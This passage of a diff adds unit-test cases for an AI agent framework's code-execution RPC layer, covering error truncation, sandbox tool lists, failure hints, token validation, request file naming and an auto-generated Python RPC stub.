+  ;; ------------------------------------------------------------ code-rpc (S6b-8)
+  {:id :rpc/tool-error-short :op :code-rpc
+   :call ["tool-error" "boom"]
+   :expect {:value "{\"error\":\"boom\"}"}}
+  {:id :rpc/tool-error-long :op :code-rpc
+   :call ["tool-error" "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"]
+   :expect {:value "{\"error\":\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx… [truncated]\"}"}}
+  {:id :rpc/result-error-trunc :op :code-rpc
+   :call ["result-error" "{\"error\":\"yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy\"}"]
+   :expect {:value "yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy"}}
+  {:id :rpc/result-error-noerror :op :code-rpc
+   :call ["result-error" "{\"ok\":true}"]
+   :expect {:value ""}}
+  {:id :rpc/result-error-garbage :op :code-rpc
+   :call ["result-error" "{\"error\""]
+   :expect {:value ""}}
+  {:id :rpc/result-error-plain :op :code-rpc
+   :call ["result-error" "boom"]
+   :expect {:value ""}}
+  {:id :rpc/errors-since-cap :op :code-rpc
+   :call ["tool-errors-since" [{"tool" "t0" "error" "e0"} {"tool" "t1" "error" "e1"} {"tool" "t2" "error" "e2"} {"tool" "t3" "error" "e3"} {"tool" "t4" "error" "e4"} {"tool" "t5" "error" "e5"} {"tool" "t6" "error" "e6"}] 0]
+   :expect {:value [{"tool" "t0" "error" "e0"} {"tool" "t1" "error" "e1"} {"tool" "t2" "error" "e2"} {"tool" "t3" "error" "e3"} {"tool" "t4" "error" "e4"}]}}
+  {:id :rpc/errors-since-offset :op :code-rpc
+   :call ["tool-errors-since" [{"tool" "t0" "error" "e0"} {"tool" "t1" "error" "e1"} {"tool" "t2" "error" "e2"} {"tool" "t3" "error" "e3"} {"tool" "t4" "error" "e4"} {"tool" "t5" "error" "e5"} {"tool" "t6" "error" "e6"} {"tool" "x"}] 7]
+   :expect {:value []}}
+  {:id :rpc/errors-since-skip-ok :op :code-rpc
+   :call ["tool-errors-since" [{"tool" "a"} {"tool" "b" "error" "bad"}] 0]
+   :expect {:value [{"tool" "b" "error" "bad"}]}}
+  {:id :rpc/sandbox-some :op :code-rpc
+   :call ["sandbox-tools-for" ["terminal" "zzz"]]
+   :expect {:value ["terminal"]}}
+  {:id :rpc/sandbox-none :op :code-rpc
+   :call ["sandbox-tools-for" []]
+   :expect {:value ["patch" "read_file" "search_files" "terminal" "web_extract" "web_search" "write_file"]}}
+  {:id :rpc/sandbox-unknown :op :code-rpc
+   :call ["sandbox-tools-for" ["zzz"]]
+   :expect {:value ["patch" "read_file" "search_files" "terminal" "web_extract" "web_search" "write_file"]}}
+  {:id :rpc/hint-import :op :code-rpc
+   :call ["failure-hint" "cannot import name 'json_parse' from 'hermes_tools'" []]
+   :expect {:value "Import helpers with `from hermes_tools import json_parse`. If that import failed, the generated module may be stale or another hermes_tools may be first on sys.path. Check hermes_tools.__file__ and retry with reset=true."}}
+  {:id :rpc/hint-name :op :code-rpc
+   :call ["failure-hint" "NameError: name 'retry' is not defined" []]
+   :expect {:value "Import retry before calling it: from hermes_tools import retry"}}
+  {:id :rpc/hint-module :op :code-rpc
+   :call ["failure-hint" "ModuleNotFoundError: No module named 'numpy.core'" []]
+   :expect {:value "'numpy.core' is not installed in the sandbox interpreter. Use Python stdlib inside execute_code, or run the code via terminal() with the project venv's python instead."}}
+  {:id :rpc/hint-dicts :op :code-rpc
+   :call ["failure-hint" "TypeError: string indices must be integers" []]
+   :expect {:value "Tool functions in the sandbox return DICTS (already parsed) — do not json.loads() them or index them like strings. Example: read_file(path)['content']."}}
+  {:id :rpc/hint-none :op :code-rpc
+   :call ["failure-hint" "all good" []]
+   :expect {:value nil}}
+  {:id :rpc/hint-blank :op :code-rpc
+   :call ["failure-hint" "" []]
+   :expect {:value nil}}
+  {:id :rpc/hint-gated-ok :op :code-rpc
+   :call ["hint-on-failure" 0 false "cannot import name 'x' from 'hermes_tools'" []]
+   :expect {:value nil}}
+  {:id :rpc/hint-gated-fail :op :code-rpc
+   :call ["hint-on-failure" 1 false "NameError: name 'retry' is not defined" []]
+   :expect {:value "Import retry before calling it: from hermes_tools import retry"}}
+  {:id :rpc/hint-gated-timeout :op :code-rpc
+   :call ["hint-on-failure" 0 true "boom" []]
+   :expect {:value nil}}
+
+  {:id :rpc/generate-terminal :op :code-rpc
+   :call ["generate-hermes-tools" ["terminal"]]
+   :expect {:value "\"\"\"Auto-generated Hermes tools RPC stubs (file-based transport).\"\"\"\nimport json, os, shlex, tempfile, threading, time\n\n_RPC_DIR = os.environ.get(\"HERMES_RPC_DIR\") or os.path.join(tempfile.gettempdir(), \"hermes_rpc\")\n_seq = 0\n# `_seq += 1` is not atomic (read-modify-write), so concurrent _call()\n# invocations from multiple threads could allocate the same sequence number\n# and clobber each other's request files. Guard seq allocation with a lock.\n_seq_lock = threading.Lock()\n\n# ---------------------------------------------------------------------------\n# Convenience helpers (avoid common scripting pitfalls)\n# ---------------------------------------------------------------------------\n\ndef json_parse(text: str):\n    \"\"\"Parse JSON tolerant of control characters and UTF-8 BOM (strict=False).\n    Use this instead of json.loads() when parsing output from terminal()\n    or web_extract() that may contain raw tabs/newlines in strings,\n    or from tools/files that prepend a UTF-8 BOM (salvage #57870, credit @woxinwuhen713-bit).\"\"\"\n    if isinstance(text, str) and text.startswith(\"﻿\"):\n        text = text[1:]\n    return json.loads(text, strict=False)\n\n\ndef shell_quote(s: str) -> str:\n    \"\"\"Shell-escape a string for safe interpolation into commands.\n    Use this when inserting dynamic content into terminal() commands:\n        terminal(f\"echo {shell_quote(user_input)}\")\n    \"\"\"\n    return shlex.quote(s)\n\n\ndef retry(fn, max_attempts=3, delay=2):\n    \"\"\"Retry a function up to max_attempts times with exponential backoff.\n    Use for transient failures (network errors, API rate limits):\n        result = retry(lambda: terminal(\"gh issue list ...\"))\n    \"\"\"\n    last_err = None\n    for attempt in range(max_attempts):\n        try:\n            return fn()\n        except Exception as e:\n            last_err = e\n            if attempt < max_attempts - 1:\n                time.sleep(delay * (2 ** attempt))\n    raise last_err\n\n\ndef _call(tool_name, args):\n    \"\"\"Send a tool call request via file-based RPC and wait for response.\"\"\"\n    global _seq\n    with _seq_lock:\n        _seq += 1\n        seq = _seq\n    seq_str = f\"{seq:06d}\"\n    req_file = os.path.join(_RPC_DIR, f\"req_{seq_str}\")\n    res_file = os.path.join(_RPC_DIR, f\"res_{seq_str}\")\n\n    # Write request atomically (write to .tmp, then rename).\n    # encoding=\"utf-8\" is critical: on Windows-hosted remote backends\n    # (or any non-UTF-8 locale) the default open() mode would mangle\n    # non-ASCII chars in tool args when encoding them as JSON.\n    tmp = req_file + \".tmp\"\n    # The request carries the RPC token and tool args: owner-only even under a\n    # permissive process umask.\n    fd = os.open(tmp, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)\n    with os.fdopen(fd, \"w\", encoding=\"utf-8\") as f:\n        json.dump({\n            \"tool\": tool_name,\n            \"args\": args,\n            \"seq\": seq,\n            \"token\": os.environ.get(\"HERMES_RPC_TOKEN\", \"\"),\n        }, f)\n    os.rename(tmp, req_file)\n\n    # Wait for response with adaptive polling\n    deadline = time.monotonic() + 300  # 5-minute timeout per tool call\n    poll_interval = 0.05  # Start at 50ms\n    while not os.path.exists(res_file):\n        if time.monotonic() > deadline:\n            raise RuntimeError(f\"RPC timeout: no response for {tool_name} after 300s\")\n        time.sleep(poll_interval)\n        poll_interval = min(poll_interval * 1.2, 0.25)  # Back off to 250ms\n\n    with open(res_file, encoding=\"utf-8\") as f:\n        raw = f.read()\n\n    # Clean up response file\n    try:\n        os.unlink(res_file)\n    except OSError:\n        pass\n\n    result = json.loads(raw)\n    if isinstance(result, str):\n        try:\n            return json.loads(result)\n        except (json.JSONDecodeError, TypeError):\n            return result\n    return result\n\ndef terminal(command: str, timeout: int = None, workdir: str = None):\n    \"\"\"Run a shell command (foreground only). Returns dict with \"output\" and \"exit_code\".\"\"\"\n    return _call('terminal', {\"command\": command, \"timeout\": timeout, \"workdir\": workdir})\n"}}
+  {:id :rpc/generate-two-sorted :op :code-rpc
+   :call ["generate-hermes-tools" ["terminal" "read_file"]]
+   :expect {:value "\"\"\"Auto-generated Hermes tools RPC stubs (file-based transport).\"\"\"\nimport json, os, shlex, tempfile, threading, time\n\n_RPC_DIR = os.environ.get(\"HERMES_RPC_DIR\") or os.path.join(tempfile.gettempdir(), \"hermes_rpc\")\n_seq = 0\n# `_seq += 1` is not atomic (read-modify-write), so concurrent _call()\n# invocations from multiple threads could allocate the same sequence number\n# and clobber each other's request files. Guard seq allocation with a lock.\n_seq_lock = threading.Lock()\n\n# ---------------------------------------------------------------------------\n# Convenience helpers (avoid common scripting pitfalls)\n# ---------------------------------------------------------------------------\n\ndef json_parse(text: str):\n    \"\"\"Parse JSON tolerant of control characters and UTF-8 BOM (strict=False).\n    Use this instead of json.loads() when parsing output from terminal()\n    or web_extract() that may contain raw tabs/newlines in strings,\n    or from tools/files that prepend a UTF-8 BOM (salvage #57870, credit @woxinwuhen713-bit).\"\"\"\n    if isinstance(text, str) and text.startswith(\"﻿\"):\n        text = text[1:]\n    return json.loads(text, strict=False)\n\n\ndef shell_quote(s: str) -> str:\n    \"\"\"Shell-escape a string for safe interpolation into commands.\n    Use this when inserting dynamic content into terminal() commands:\n        terminal(f\"echo {shell_quote(user_input)}\")\n    \"\"\"\n    return shlex.quote(s)\n\n\ndef retry(fn, max_attempts=3, delay=2):\n    \"\"\"Retry a function up to max_attempts times with exponential backoff.\n    Use for transient failures (network errors, API rate limits):\n        result = retry(lambda: terminal(\"gh issue list ...\"))\n    \"\"\"\n    last_err = None\n    for attempt in range(max_attempts):\n        try:\n            return fn()\n        except Exception as e:\n            last_err = e\n            if attempt < max_attempts - 1:\n                time.sleep(delay * (2 ** attempt))\n    raise last_err\n\n\ndef _call(tool_name, args):\n    \"\"\"Send a tool call request via file-based RPC and wait for response.\"\"\"\n    global _seq\n    with _seq_lock:\n        _seq += 1\n        seq = _seq\n    seq_str = f\"{seq:06d}\"\n    req_file = os.path.join(_RPC_DIR, f\"req_{seq_str}\")\n    res_file = os.path.join(_RPC_DIR, f\"res_{seq_str}\")\n\n    # Write request atomically (write to .tmp, then rename).\n    # encoding=\"utf-8\" is critical: on Windows-hosted remote backends\n    # (or any non-UTF-8 locale) the default open() mode would mangle\n    # non-ASCII chars in tool args when encoding them as JSON.\n    tmp = req_file + \".tmp\"\n    # The request carries the RPC token and tool args: owner-only even under a\n    # permissive process umask.\n    fd = os.open(tmp, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)\n    with os.fdopen(fd, \"w\", encoding=\"utf-8\") as f:\n        json.dump({\n            \"tool\": tool_name,\n            \"args\": args,\n            \"seq\": seq,\n            \"token\": os.environ.get(\"HERMES_RPC_TOKEN\", \"\"),\n        }, f)\n    os.rename(tmp, req_file)\n\n    # Wait for response with adaptive polling\n    deadline = time.monotonic() + 300  # 5-minute timeout per tool call\n    poll_interval = 0.05  # Start at 50ms\n    while not os.path.exists(res_file):\n        if time.monotonic() > deadline:\n            raise RuntimeError(f\"RPC timeout: no response for {tool_name} after 300s\")\n        time.sleep(poll_interval)\n        poll_interval = min(poll_interval * 1.2, 0.25)  # Back off to 250ms\n\n    with open(res_file, encoding=\"utf-8\") as f:\n        raw = f.read()\n\n    # Clean up response file\n    try:\n        os.unlink(res_file)\n    except OSError:\n        pass\n\n    result = json.loads(raw)\n    if isinstance(result, str):\n        try:\n            return json.loads(result)\n        except (json.JSONDecodeError, TypeError):\n            return result\n    return result\n\ndef read_file(path: str, offset: int = 1, limit: int = 2000):\n    \"\"\"Read a file (1-indexed lines). Returns dict with \"content\" and \"total_lines\".\"\"\"\n    return _call('read_file', {\"path\": path, \"offset\": offset, \"limit\": limit})\n\ndef terminal(command: str, timeout: int = None, workdir: str = None):\n    \"\"\"Run a shell command (foreground only). Returns dict with \"output\" and \"exit_code\".\"\"\"\n    return _call('terminal', {\"command\": command, \"timeout\": timeout, \"workdir\": workdir})\n"}}
+  ;; ------------------------------------------------------------ code-rpc finish (S6b-10)
+  {:id :rpc/token-null :op :code-rpc
+   :call ["token-str" {}]
+   :expect {:value ""}}
+  {:id :rpc/token-false :op :code-rpc
+   :call ["token-str" {"token" false}]
+   :expect {:value ""}}
+  {:id :rpc/token-num :op :code-rpc
+   :call ["token-str" {"token" 5}]
+   :expect {:value "5"}}
+  {:id :rpc/token-str :op :code-rpc
+   :call ["token-str" {"token" "abc"}]
+   :expect {:value "abc"}}
+  {:id :rpc/make-defaults :op :code-rpc
+   :call ["make-state" {}]
+   :expect {:value {:rpc-dir nil :rpc-token "" :allowed ["patch" "read_file" "search_files" "terminal" "web_extract" "web_search" "write_file"] :max-tool-calls 50 :counter 0}}}
+  {:id :rpc/make-custom :op :code-rpc
+   :call ["make-state" {:rpc-dir "/r" :rpc-token "t" :allowed-tools ["terminal"] :max-tool-calls 3}]
+   :expect {:value {:rpc-dir "/r" :rpc-token "t" :allowed ["terminal"] :max-tool-calls 3 :counter 0}}}
+  {:id :rpc/finish-string :op :code-rpc
+   :call ["finish-call" "terminal" {"command" "echo hi"} "ok"]
+   :expect {:value {:result "ok" :count 1 :log [{"tool" "terminal" "args_preview" "{\"command\" \"echo hi\"}"}]}}}
+  {:id :rpc/finish-map :op :code-rpc
+   :call ["finish-call" "terminal" {"command" "echo hi"} {"v" 1}]
+   :expect {:value {:result "{\"v\":1}" :count 1 :log [{"tool" "terminal" "args_preview" "{\"command\" \"echo hi\"}"}]}}}
+  {:id :rpc/finish-error :op :code-rpc
+   :call ["finish-call" "terminal" {"command" "x"} {"error" "eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee"}]
+   :expect {:value {:result "{\"error\":\"eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee\"}" :count 1 :log [{"tool" "terminal" "args_preview" "{\"command\" \"x\"}" "error" "eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee"}]}}}
+  {:id :rpc/finish-twice :op :code-rpc
+   :call ["finish-call" "terminal" {"command" "x"} ["a" "b"]]
+   :expect {:value {:result "b" :count 2 :log [{"tool" "terminal" "args_preview" "{\"command\" \"x\"}"} {"tool" "terminal" "args_preview" "{\"command\" \"x\"}"}]}}}
+  {:id :rpc/finish-trunc :op :code-rpc
+   :call ["finish-call" "terminal" {"k" "yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy"} "ok"]
+   :expect {:value {:result "ok" :count 1 :log [{"tool" "terminal" "args_preview" "{\"k\" \"yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy"}]}}}
+  {:id :rpc/token-ok-match :op :code-rpc
+   :call ["token-ok?" {"token" "s3cr3t"} "s3cr3t"]
+   :expect {:value true}}
+  {:id :rpc/token-ok-wrong :op :code-rpc
+   :call ["token-ok?" {"token" "s3cr3t"} "nope"]
+   :expect {:value false}}
+  {:id :rpc/token-ok-empty-server :op :code-rpc
+   :call ["token-ok?" {"token" "s3cr3t"} ""]
+   :expect {:value false}}
+  {:id :rpc/token-ok-blank-server :op :code-rpc
+   :call ["token-ok?" {"token" "s3cr3t"} " "]
+   :expect {:value false}}
+  {:id :rpc/token-ok-missing :op :code-rpc
+   :call ["token-ok?" {} "s3cr3t"]
+   :expect {:value false}}
+  {:id :rpc/token-ok-num :op :code-rpc
+   :call ["token-ok?" {"token" 42} "42"]
+   :expect {:value true}}
+  {:id :rpc/token-ok-nonstring-server :op :code-rpc
+   :call ["token-ok?" {"token" "x"} 42]
+   :expect {:value false}}
+  {:id :rpc/token-ok-length :op :code-rpc
+   :call ["token-ok?" {"token" "abcdef"} "abc"]
+   :expect {:value false}}
+  {:id :rpc/duration-1500 :op :code-rpc
+   :call ["duration-seconds" 0 1500]
+   :expect {:value 1.5}}
+  {:id :rpc/duration-half-up :op :code-rpc
+   :call ["duration-seconds" 0 1555]
+   :expect {:value 1.56}}
+  {:id :rpc/duration-1499 :op :code-rpc
+   :call ["duration-seconds" 0 1499]
+   :expect {:value 1.5}}
+  {:id :rpc/duration-zero :op :code-rpc
+   :call ["duration-seconds" 1000 1000]
+   :expect {:value 0.0}}
+  {:id :rpc/req-ok :op :code-rpc
+   :call ["req-file?" "req_000001"]
+   :expect {:value true}}
+  {:id :rpc/req-tmp :op :code-rpc
+   :call ["req-file?" "req_000001.tmp"]
+   :expect {:value false}}
+  {:id :rpc/req-res :op :code-rpc
+   :call ["req-file?" "res_000001"]
+   :expect {:value false}}
+  {:id :rpc/req-bare :op :code-rpc
+   :call ["req-file?" "req_"]
+   :expect {:value true}}
+  {:id :rpc/req-prefix :op :code-rpc
+   :call ["req-file?" "xreq_000001"]
+   :expect {:value false}}
+  {:id :rpc/res-one :op :code-rpc
+   :call ["res-name" 1]
+   :expect {:value "res_000001"}}
+  {:id :rpc/res-42 :op :code-rpc
+   :call ["res-name" 42]
+   :expect {:value "res_000042"}}
+  {:id :rpc/res-zero :op :code-rpc
+   :call ["res-name" 0]
+   :expect {:value "res_000000"}}
+  {:id :rpc/res-neg :op :code-rpc
+   :call ["res-name" -1]
+   :expect {:value "res_-00001"}}
+  {:id :rpc/res-overflow :op :code-rpc
+   :call ["res-name" 1234567]
+   :expect {:value "res_1234567"}}
+  {:id :rpc/int-one :op :code-rpc
+   :call ["int-seq?" 1]
+   :expect {:value true}}
+  {:id :rpc/int-float :op :code-rpc
+   :call ["int-seq?" 1.0]
+   :expect {:value true}}
+  {:id :rpc/int-zero :op :code-rpc
+   :call ["int-seq?" 0]
+   :expect {:value true}}
+  {:id :rpc/int-frac :op :code-rpc
+   :call ["int-seq?" 1.5]
+   :expect {:value false}}
+  {:id :rpc/int-str :op :code-rpc
+   :call ["int-seq?" "1"]
+   :expect {:value false}}
+  {:id :rpc/int-bool :op :code-rpc
+   :call ["int-seq?" true]
+   :expect {:value false}}
+  {:id :rpc/int-nil :op :code-rpc
+   :call ["int-seq?" nil]
+   :expect {:value false}}
+  {:id :rpc/refuse-ok :op :code-rpc
+   :call ["refusal" ["terminal" "read_file"] "read_file" 0 50]
+   :expect {:value nil}}
+  {:id :rpc/refuse-not-allowed :op :code-rpc
+   :call ["refusal" ["terminal"] "web_search" 0 50]
